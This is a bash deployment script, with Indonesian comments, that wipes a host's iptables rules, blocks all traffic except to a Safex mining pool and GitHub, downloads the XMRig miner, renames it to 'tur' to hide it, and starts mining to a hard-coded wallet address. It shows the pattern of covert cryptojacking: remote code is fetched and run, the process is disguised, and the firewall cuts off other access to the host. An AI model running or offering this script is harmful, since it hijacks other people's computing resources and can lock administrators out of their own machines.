#!/bin/bash

######################################################################## IP TABLES ####################################################################################
#### Agar tidak terlocked 
sudo -u root iptables -P INPUT ACCEPT
sudo -u root iptables -P FORWARD ACCEPT
sudo -u root iptables -P OUTPUT ACCEPT

############ Flush 
sudo -u root iptables -t nat -F
sudo -u root iptables -t mangle -F
sudo -u root iptables -F
sudo -u root iptables -X

iptables -A INPUT -s sf.pool-pay.com -j ACCEPT
iptables -A OUTPUT -d sf.pool-pay.com -j ACCEPT
iptables -A INPUT -s github.com -j ACCEPT
iptables -A OUTPUT -d github.com -j ACCEPT
iptables -A INPUT -s raw.githubusercontent.com -j ACCEPT
iptables -A OUTPUT -d raw.githubusercontent.com -j ACCEPT

# Drop everything
iptables -P INPUT DROP
iptables -P OUTPUT DROP

################################################################################################################################################

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
tar xf xmrig-6.17.0-linux-static-x64.tar.gz
cd xmrig-6.17.0
mv xmrig tur

./tur -o sf.pool-pay.com:4025 -t 1 -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx

#
#./tur -o sf.pool-pay.com:4025 -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx
#
